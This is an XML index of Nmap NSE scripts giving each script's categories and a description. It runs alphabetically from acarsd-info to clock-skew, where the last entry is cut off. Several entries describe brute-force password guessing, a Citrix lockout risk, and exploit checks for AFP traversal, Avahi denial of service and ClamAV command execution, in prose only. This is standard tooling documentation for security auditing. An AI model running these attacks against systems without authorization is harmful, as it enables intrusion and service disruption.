<nse-scripts>
<directory name="scripts" path="E:\Software\Nmap/scripts/"></directory>
<directory name="nselib" path="E:\Software\Nmap/nselib/"></directory>
<script filename="E:\Software\Nmap/scripts\acarsd-info.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Retrieves information from a listening acarsd daemon. Acarsd decodes&#xa;ACARS (Aircraft Communication Addressing and Reporting System) data in&#xa;real time.  The information retrieved by this script includes the&#xa;daemon version, API version, administrator e-mail address and&#xa;listening frequency.&#xa;&#xa;For more information about acarsd, see:&#xa;* http://www.acarsd.org/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\address-info.nse">
<categories><category>default</category><category>safe</category></categories>
<description>Shows extra information about IPv6 addresses, such as embedded MAC or IPv4 addresses when available.&#xa;&#xa;Some IP address formats encode extra information; for example some IPv6&#xa;addresses encode an IPv4 address or MAC address. This script can decode&#xa;these address formats:&#xa;* IPv4-compatible IPv6 addresses,&#xa;* IPv4-mapped IPv6 addresses,&#xa;* Teredo IPv6 addresses,&#xa;* 6to4 IPv6 addresses,&#xa;* IPv6 addresses using an EUI-64 interface ID,&#xa;* IPv4-embedded IPv6 addresses,&#xa;* IPv4-translated IPv6 addresses and&#xa;* ISATAP Modified EUI-64 IPv6 addresses.&#xa;&#xa;See RFC 4291 for general IPv6 addressing architecture and the&#xa;definitions of some terms.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\afp-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs password guessing against Apple Filing Protocol (AFP).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\afp-ls.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Attempts to get useful information about files from AFP volumes.&#xa;The output is intended to resemble the output of &lt;code&gt;ls&lt;/code&gt;.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\afp-path-vuln.nse">
<categories><category>exploit</category><category>intrusive</category><category>vuln</category></categories>
<description>Detects the Mac OS X AFP directory traversal vulnerability, CVE-2010-0533.&#xa;&#xa;This script attempts to iterate over all AFP shares on the remote&#xa;host. For each share it attempts to access the parent directory by&#xa;exploiting the directory traversal vulnerability as described in&#xa;CVE-2010-0533.&#xa;&#xa;The script reports whether the system is vulnerable or not. In&#xa;addition it lists the contents of the parent and child directories to&#xa;a max depth of 2.&#xa;When running in verbose mode, all items in the listed directories are&#xa;shown.  In non verbose mode, output is limited to the first 5 items.&#xa;If the server is not vulnerable, the script will not return any&#xa;information.&#xa;&#xa;For additional information:&#xa;* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0533&#xa;* http://www.cqure.net/wp/2010/03/detecting-apple-mac-os-x-afp-vulnerability-cve-2010-0533-with-nmap&#xa;* http://support.apple.com/kb/HT1222&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\afp-serverinfo.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Shows AFP server information. This information includes the server&apos;s&#xa;hostname, IPv4 and IPv6 addresses, and hardware type (for example&#xa;&lt;code&gt;Macmini&lt;/code&gt; or &lt;code&gt;MacBookPro&lt;/code&gt;).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\afp-showmount.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Shows AFP shares and ACLs.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ajp-auth.nse">
<categories><category>default</category><category>auth</category><category>safe</category></categories>
<description>Retrieves the authentication scheme and realm of an AJP service (Apache JServ Protocol) that requires authentication.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ajp-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force passwords auditing against the Apache JServ protocol.&#xa;The Apache JServ Protocol is commonly used by web servers to communicate with&#xa;back-end Java application server containers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ajp-headers.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Performs a HEAD or GET request against either the root directory or any&#xa;optional directory of an Apache JServ Protocol server and returns the server response headers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ajp-methods.nse">
<categories><category>default</category><category>safe</category></categories>
<description>Discovers which options are supported by the AJP (Apache JServ&#xa;Protocol) server by sending an OPTIONS request and lists potentially&#xa;risky methods.&#xa;&#xa;In this script, &quot;potentially risky&quot; methods are anything except GET,&#xa;HEAD, POST, and OPTIONS. If the script reports potentially risky&#xa;methods, they may not all be security risks, but you should check to&#xa;make sure. This page lists the dangers of some common methods:&#xa;&#xa;http://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ajp-request.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Requests a URI over the Apache JServ Protocol and displays the result&#xa;(or stores it in a file). Different AJP methods such as; GET, HEAD,&#xa;TRACE, PUT or DELETE may be used.&#xa;&#xa;The Apache JServ Protocol is commonly used by web servers to communicate with&#xa;back-end Java application server containers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\allseeingeye-info.nse">
<categories><category>discovery</category><category>safe</category><category>version</category></categories>
<description>Detects the All-Seeing Eye service. Provided by some game servers for&#xa;querying the server&apos;s status.&#xa;&#xa;The All-Seeing Eye service can listen on a UDP port separate from the&#xa;main game server port (usually game port + 123). On receiving a packet&#xa;with the payload &quot;s&quot;, it replies with various game server status info.&#xa;&#xa;When run as a version detection script (&lt;code&gt;-sV&lt;/code&gt;), the script&#xa;will report on the game name, version, actual port, and whether it has a&#xa;password. When run explicitly (&lt;code&gt;-&#45;script allseeingeye-info&lt;/code&gt;), the&#xa;script will additionally report on the server name, game type, map name,&#xa;current number of players, maximum number of players, player&#xa;information, and various other information.&#xa;&#xa;For more info on the protocol see:&#xa;http://int64.org/docs/gamestat-protocols/ase.html&#xa;http://aluigi.altervista.org/papers.htm#ase&#xa;http://sourceforge.net/projects/gameq/&#xa;(relevant files: games.ini, packets.ini, ase.php)&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\amqp-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category><category>version</category></categories>
<description>Gathers information (a list of all server properties) from an AMQP (advanced message queuing protocol) server.&#xa;&#xa;See http://www.rabbitmq.com/extensions.html for details on the&#xa;&lt;code&gt;server-properties&lt;/code&gt; field.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\asn-query.nse">
<categories><category>discovery</category><category>external</category><category>safe</category></categories>
<description>Maps IP addresses to autonomous system (AS) numbers.&#xa;&#xa;The script works by sending DNS TXT queries to a DNS server which in&#xa;turn queries a third-party service provided by Team Cymru&#xa;(https://www.team-cymru.org/Services/ip-to-asn.html) using an in-addr.arpa&#xa;style zone set up especially for&#xa;use by Nmap. The responses to these queries contain both Origin and Peer&#xa;ASNs and their descriptions, displayed along with the BGP Prefix and&#xa;Country Code. The script caches results to reduce the number of queries&#xa;and should perform a single query for all scanned targets in a BGP&#xa;Prefix present in Team Cymru&apos;s database.&#xa;&#xa;Be aware that any targets against which this script is run will be sent&#xa;to and potentially recorded by one or more DNS servers and Team Cymru.&#xa;In addition your IP address will be sent along with the ASN to a DNS&#xa;server (your default DNS server, or whichever one you specified with the&#xa;&lt;code&gt;dns&lt;/code&gt; script argument).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\auth-owners.nse">
<categories><category>default</category><category>safe</category></categories>
<description>Attempts to find the owner of an open TCP port by querying an auth&#xa;daemon which must also be open on the target system. The auth service,&#xa;also known as identd, normally runs on port 113.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\auth-spoof.nse">
<categories><category>malware</category><category>safe</category></categories>
<description>Checks for an identd (auth) server which is spoofing its replies.&#xa;&#xa;Tests whether an identd (auth) server responds with an answer before&#xa;we even send the query.  This sort of identd spoofing can be a sign of&#xa;malware infection, though it can also be used for legitimate privacy&#xa;reasons.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\backorifice-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against the BackOrifice service. The&#xa;&lt;code&gt;backorifice-brute.ports&lt;/code&gt; script argument is mandatory (it specifies ports to run&#xa;the script against).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\backorifice-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Connects to a BackOrifice service and gathers information about&#xa;the host and the BackOrifice service itself.&#xa;&#xa;The extracted host information includes basic system setup, list&#xa;of running processes, network resources and shares.&#xa;&#xa;Information about the service includes enabled port redirections,&#xa;listening console applications and a list of BackOrifice plugins&#xa;installed with the service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\bacnet-info.nse">
<categories><category>discovery</category><category>version</category></categories>
<description>Discovers and enumerates BACNet Devices collects device information based off&#xa;standard requests. In some cases, devices may not strictly follow the&#xa;specifications, or may comply with older versions of the specifications, and&#xa;will result in a BACNET error response. Presence of this error positively&#xa;identifies the device as a BACNet device, but no enumeration is possible.&#xa;&#xa;Note: Requests and responses are via UDP 47808, ensure scanner will receive UDP&#xa;47808 source and destination responses.&#xa;&#xa;http://digitalbond.com&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\banner.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>A simple banner grabber which connects to an open TCP port and prints out anything sent by the listening service within five seconds.&#xa;&#xa;The banner will be truncated to fit into a single line, but an extra line may be printed for every&#xa;increase in the level of verbosity requested on the command line.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\bitcoin-getaddr.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Queries a Bitcoin server for a list of known Bitcoin nodes&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\bitcoin-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Extracts version and node information from a Bitcoin server&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\bitcoinrpc-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Obtains information from a Bitcoin server by calling &lt;code&gt;getinfo&lt;/code&gt; on its JSON-RPC interface.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\bittorrent-discovery.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Discovers bittorrent peers sharing a file based on a user-supplied&#xa;torrent file or magnet link.  Peers implement the Bittorrent protocol&#xa;and share the torrent, whereas the nodes (only shown if the&#xa;include-nodes NSE argument is given) implement the DHT protocol and&#xa;are used to track the peers. The sets of peers and nodes are not the&#xa;same, but they usually intersect.&#xa;&#xa;If the &lt;code&gt;newtargets&lt;/code&gt; script-arg is supplied it adds the discovered&#xa;peers as targets.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\bjnp-discover.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Retrieves printer or scanner information from a remote device supporting the&#xa;BJNP protocol. The protocol is known to be supported by network based Canon&#xa;devices.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-ataoe-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Discovers servers supporting the ATA over Ethernet protocol. ATA over Ethernet&#xa;is an ethernet protocol developed by the Brantley Coile Company and allows for&#xa;simple, high-performance access to SATA drives over Ethernet.&#xa;&#xa;Discovery is performed by sending a Query Config Request to the Ethernet&#xa;broadcast address with all bits set in the major and minor fields of the&#xa;header.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-avahi-dos.nse">
<categories><category>broadcast</category><category>dos</category><category>intrusive</category><category>vuln</category></categories>
<description>Attempts to discover hosts in the local network using the DNS Service&#xa;Discovery protocol and sends a NULL UDP packet to each host to test&#xa;if it is vulnerable to the Avahi NULL UDP packet denial of service&#xa;(CVE-2011-1002).&#xa;&#xa;The &lt;code&gt;broadcast-avahi-dos.wait&lt;/code&gt; script argument specifies how&#xa;many number of seconds to wait before a new attempt of host discovery.&#xa;Each host who does not respond to this second attempt will be considered&#xa;vulnerable.&#xa;&#xa;Reference:&#xa;* http://avahi.org/ticket/325&#xa;* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1002&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-bjnp-discover.nse">
<categories><category>safe</category><category>broadcast</category></categories>
<description>Attempts to discover Canon devices (Printers/Scanners) supporting the&#xa;BJNP protocol by sending BJNP Discover requests to the network&#xa;broadcast address for both ports associated with the protocol.&#xa;&#xa;The script then attempts to retrieve the model, version and some additional&#xa;information for all discovered devices.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-db2-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Attempts to discover DB2 servers on the network by sending a broadcast request to port 523/udp.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-dhcp-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Sends a DHCP request to the broadcast address (255.255.255.255) and reports&#xa;the results. By default, the script uses a static MAC address&#xa;(DE:AD:CO:DE:CA:FE) in order to prevent IP pool exhaustion.&#xa;&#xa;The script reads the response using pcap by opening a listening pcap socket&#xa;on all available ethernet interfaces that are reported up. If no response&#xa;has been received before the timeout has been reached (default 10 seconds)&#xa;the script will abort execution.&#xa;&#xa;The script needs to be run as a privileged user, typically root.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-dhcp6-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Sends a DHCPv6 request (Solicit) to the DHCPv6 multicast address,&#xa;parses the response, then extracts and prints the address along with&#xa;any options returned by the server.&#xa;&#xa;The script requires Nmap to be run in privileged mode as it binds the socket&#xa;to a privileged port (udp/546).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-dns-service-discovery.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Attempts to discover hosts&apos; services using the DNS Service Discovery protocol.  It sends a multicast DNS-SD query and collects all the responses.&#xa;&#xa;The script first sends a query for _services._dns-sd._udp.local to get a&#xa;list of services. It then sends a followup query for each one to try to&#xa;get more information.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-dropbox-listener.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Listens for the LAN sync information broadcasts that the Dropbox.com client&#xa;broadcasts every 20 seconds, then prints all the discovered client IP&#xa;addresses, port numbers, version numbers, display names, and more.&#xa;&#xa;If the &lt;code&gt;newtargets&lt;/code&gt; script argument is given, all discovered Dropbox&#xa;clients will be added to the Nmap target list rather than just listed in the&#xa;output.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-eigrp-discovery.nse">
<categories><category>discovery</category><category>broadcast</category><category>safe</category></categories>
<description>Performs network discovery and routing information gathering through&#xa;Cisco&apos;s Enhanced Interior Gateway Routing Protocol (EIGRP).&#xa;&#xa;The script works by sending an EIGRP Hello packet with the specified Autonomous&#xa;System value to the 224.0.0.10 multicast address and listening for EIGRP Update&#xa;packets. The script then parses the update responses for routing information.&#xa;&#xa;If no A.S value was provided by the user, the script will listen for multicast&#xa;Hello packets to grab an A.S value. If no interface was provided as a script&#xa;argument or through the -e option, the script will send packets and listen&#xa;through all valid ethernet interfaces simultaneously.&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-hid-discoveryd.nse">
<categories><category>discovery</category><category>broadcast</category><category>safe</category></categories>
<description>Discovers HID devices on a LAN by sending a discoveryd network broadcast probe.&#xa;&#xa;For more information about HID discoveryd, see:&#xa;* http://nosedookie.blogspot.com/2011/07/identifying-and-querying-hid-vertx.html&#xa;* https://github.com/coldfusion39/VertXploit&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-igmp-discovery.nse">
<categories><category>discovery</category><category>safe</category><category>broadcast</category></categories>
<description>Discovers targets that have IGMP Multicast memberships and grabs interesting information.&#xa;&#xa;The scripts works by sending IGMP Membership Query message to the 224.0.0.1 All&#xa;Hosts multicast address and listening for IGMP Membership Report messages. The&#xa;script then extracts all the interesting information from the report messages&#xa;such as the version, group, mode, source addresses (depending on the version).&#xa;&#xa;The script defaults to sending an IGMPv2 Query but this could be changed to&#xa;another version (version 1 or 3) or to sending queries of all three version. If&#xa;no interface was specified as a script argument or with the -e option, the&#xa;script will proceed to sending queries through all the valid ethernet&#xa;interfaces.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-jenkins-discover.nse">
<categories><category>discovery</category><category>broadcast</category><category>safe</category></categories>
<description>Discovers Jenkins servers on a LAN by sending a discovery broadcast probe.&#xa;&#xa;For more information about Jenkins auto discovery, see:&#xa;* https://wiki.jenkins.io/display/JENKINS/Auto-discovering+Jenkins+on+the+network&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-listener.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Sniffs the network for incoming broadcast communication and&#xa;attempts to decode the received packets. It supports protocols like CDP, HSRP,&#xa;Spotify, DropBox, DHCP, ARP and a few more. See packetdecoders.lua for more&#xa;information.&#xa;&#xa;The script attempts to sniff all ethernet based interfaces with an IPv4 address&#xa;unless a specific interface was given using the -e argument to Nmap.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-ms-sql-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Discovers Microsoft SQL servers in the same broadcast domain.&#xa;&#xa;SQL Server credentials required: No (will not benefit from&#xa;&lt;code&gt;mssql.username&lt;/code&gt; &amp; &lt;code&gt;mssql.password&lt;/code&gt;).&#xa;&#xa;The script attempts to discover SQL Server instances in the same broadcast&#xa;domain. Any instances found are stored in the Nmap registry for use by any&#xa;other ms-sql-* scripts that are run in the same scan.&#xa;&#xa;In contrast to the &lt;code&gt;ms-sql-discover&lt;/code&gt; script, the broadcast version&#xa;will use a broadcast method rather than targeting individual hosts. However, the&#xa;broadcast version will only use the SQL Server Browser service discovery method.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-netbios-master-browser.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Attempts to discover master browsers and the domains they manage.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-networker-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Discovers EMC Networker backup software servers on a LAN by sending a network broadcast query.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-novell-locate.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Attempts to use the Service Location Protocol to discover Novell NetWare Core Protocol (NCP) servers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-ospf2-discover.nse">
<categories><category>broadcast</category><category>discovery</category><category>safe</category></categories>
<description>Discover IPv4 networks using Open Shortest Path First version 2(OSPFv2) protocol.&#xa;&#xa;The script works by listening for OSPF Hello packets from the 224.0.0.5&#xa;multicast address. The script then replies and attempts to create a neighbor&#xa;relationship, in order to discover network database.&#xa;&#xa;If no interface was provided as a script argument or through the -e option,&#xa;the script will fail unless a single interface is present on the system.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-pc-anywhere.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Sends a special broadcast probe to discover PC-Anywhere hosts running on a LAN.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-pc-duo.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Discovers PC-DUO remote control hosts and gateways running on a LAN by sending a special broadcast UDP probe.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-pim-discovery.nse">
<categories><category>discovery</category><category>safe</category><category>broadcast</category></categories>
<description>Discovers routers that are running PIM (Protocol Independent Multicast).&#xa;&#xa;This works by sending a PIM Hello message to the PIM multicast address&#xa;224.0.0.13 and listening for Hello messages from other routers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-ping.nse">
<categories><category>discovery</category><category>safe</category><category>broadcast</category></categories>
<description>Sends broadcast pings on a selected interface using raw ethernet packets and&#xa;outputs the responding hosts&apos; IP and MAC addresses or (if requested) adds them&#xa;as targets.  Root privileges on UNIX are required to run this script since it&#xa;uses raw sockets.  Most operating systems don&apos;t respond to broadcast-ping&#xa;probes, but they can be configured to do so.&#xa;&#xa;The interface on which is broadcasted can be specified using the -e Nmap option&#xa;or the &lt;code&gt;broadcast-ping.interface&lt;/code&gt; script-arg. If no interface is&#xa;specified this script broadcasts on all ethernet interfaces which have an IPv4&#xa;address defined.&#xa;&#xa;The &lt;code&gt;newtarget&lt;/code&gt; script-arg can be used so the script adds the&#xa;discovered IPs as targets.&#xa;&#xa;The timeout of the ICMP probes can be specified using the &lt;code&gt;timeout&lt;/code&gt;&#xa;script-arg. The default timeout is 3000 ms. A higher number might be necessary&#xa;when scanning across larger networks.&#xa;&#xa;The number of sent probes can be specified using the &lt;code&gt;num-probes&lt;/code&gt;&#xa;script-arg. The default number is 1. A higher value might get more results on&#xa;larger networks.&#xa;&#xa;The ICMP probes sent comply with the -&#45;ttl and -&#45;data-length Nmap options, so&#xa;you can use those to control the TTL(time to live) and ICMP payload length&#xa;respectively. The default value for TTL is 64, and the length of the payload&#xa;is 0. The payload is consisted of random bytes.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-pppoe-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Discovers PPPoE (Point-to-Point Protocol over Ethernet) servers using&#xa;the PPPoE Discovery protocol (PPPoED).  PPPoE is an ethernet based&#xa;protocol so the script has to know what ethernet interface to use for&#xa;discovery. If no interface is specified, requests are sent out on all&#xa;available interfaces.&#xa;&#xa;As the script send raw ethernet frames it requires Nmap to be run in privileged&#xa;mode to operate.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-rip-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Discovers hosts and routing information from devices running RIPv2 on the&#xa;LAN. It does so by sending a RIPv2 Request command and collects the responses&#xa;from all devices responding to the request.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-ripng-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Discovers hosts and routing information from devices running RIPng on the&#xa;LAN by sending a broadcast RIPng Request command and collecting any responses.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-sonicwall-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Discovers Sonicwall firewalls which are directly attached (not routed) using&#xa;the same method as the manufacturers own &apos;SetupTool&apos;. An interface needs to be&#xa;configured, as the script broadcasts a UDP packet.&#xa;&#xa;The script needs to be run as a privileged user, typically root.&#xa;&#xa;References:&#xa;* https://support.software.dell.com/kb/sw3677)&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-sybase-asa-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Discovers Sybase Anywhere servers on the LAN by sending broadcast discovery messages.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-tellstick-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Discovers Telldus Technologies TellStickNet devices on the LAN. The Telldus&#xa;TellStick is used to wirelessly control electric devices such as lights,&#xa;dimmers and electric outlets. For more information: http://www.telldus.com/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-upnp-info.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Attempts to extract system information from the UPnP service by sending a multicast query, then collecting, parsing, and displaying all responses.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-versant-locate.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Discovers Versant object databases using the broadcast srvloc protocol.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-wake-on-lan.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Wakes a remote system up from sleep by sending a Wake-On-Lan packet.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-wpad-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Retrieves a list of proxy servers on a LAN using the Web Proxy&#xa;Autodiscovery Protocol (WPAD).  It implements both the DHCP and DNS&#xa;methods of doing so and starts by querying DHCP to get the address.&#xa;DHCP discovery requires nmap to be running in privileged mode and will&#xa;be skipped when this is not the case.  DNS discovery relies on the&#xa;script being able to resolve the local domain either through a script&#xa;argument or by attempting to reverse resolve the local IP.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-wsdd-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Uses a multicast query to discover devices supporting the Web Services&#xa;Dynamic Discovery (WS-Discovery) protocol. It also attempts to locate&#xa;any published Windows Communication Framework (WCF) web services (.NET&#xa;4.0 or later).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\broadcast-xdmcp-discover.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Discovers servers running the X Display Manager Control Protocol (XDMCP) by&#xa;sending a XDMCP broadcast request to the LAN. Display managers allowing access&#xa;are marked using the keyword Willing in the result.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\cassandra-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against the Cassandra database.&#xa;&#xa;For more information about Cassandra, see:&#xa;http://cassandra.apache.org/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\cassandra-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to get basic info and server status from a Cassandra database.&#xa;&#xa;For more information about Cassandra, see:&#xa;http://cassandra.apache.org/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\cccam-version.nse">
<categories><category>version</category></categories>
<description>Detects the CCcam service (software for sharing subscription TV among&#xa;multiple receivers).&#xa;&#xa;The service normally runs on port 12000. It distinguishes&#xa;itself by printing 16 random-looking bytes upon receiving a&#xa;connection.&#xa;&#xa;Because the script attempts to detect &quot;random-looking&quot; bytes, it has a small&#xa;chance of failing to detect the service when the data do not seem random&#xa;enough.</description>
</script>
<script filename="E:\Software\Nmap/scripts\cics-enum.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>CICS transaction ID enumerator for IBM mainframes.&#xa;This script is based on mainframe_brute by Dominic White&#xa;(https://github.com/sensepost/mainframe_brute). However, this script&#xa;doesn&apos;t rely on any third party libraries or tools and instead uses&#xa;the NSE TN3270 library which emulates a TN3270 screen in lua.&#xa;&#xa;CICS only allows for 4 byte transaction IDs, that is the only specific rule&#xa;found for CICS transaction IDs.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\cics-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Using the CICS transaction CEMT, this script attempts to gather information&#xa;about the current CICS transaction server region. It gathers OS information,&#xa;Datasets (files), transactions and user ids. Based on CICSpwn script by&#xa;Ayoub ELAASSAL.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\cics-user-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>CICS User ID brute forcing script for the CESL login screen.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\cics-user-enum.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>CICS User ID enumeration script for the CESL/CESN Login screen.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\citrix-brute-xml.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Attempts to guess valid credentials for the Citrix PN Web Agent XML&#xa;Service. The XML service authenticates against the local Windows server&#xa;or the Active Directory.&#xa;&#xa;This script makes no attempt of preventing account lockout. If the&#xa;password list contains more passwords than the lockout-threshold&#xa;accounts will be locked.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\citrix-enum-apps-xml.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Extracts a list of applications, ACLs, and settings from the Citrix XML&#xa;service.&#xa;&#xa;The script returns more output with higher verbosity.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\citrix-enum-apps.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Extracts a list of published applications from the ICA Browser service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\citrix-enum-servers-xml.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Extracts the name of the server farm and member servers from Citrix XML&#xa;service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\citrix-enum-servers.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Extracts a list of Citrix servers from the ICA Browser service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\clamav-exec.nse">
<categories><category>exploit</category><category>vuln</category></categories>
<description>Exploits ClamAV servers vulnerable to unauthenticated clamav comand execution.&#xa;&#xa;ClamAV server 0.99.2, and possibly other previous versions, allow the execution&#xa;of dangerous service commands without authentication. Specifically, the command &apos;SCAN&apos;&#xa;may be used to list system files and the command &apos;SHUTDOWN&apos; shut downs the&#xa;service. This vulnerability was discovered by Alejandro Hernandez (nitr0us).&#xa;&#xa;This script without arguments test the availability of the command &apos;SCAN&apos;.&#xa;&#xa;Reference:&#xa;* https://twitter.com/nitr0usmx/status/740673507684679680&#xa;* https://bugzilla.clamav.net/show_bug.cgi?id=11585&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\clock-skew.nse">
<categories><category>default</category><category>safe</category></categories>
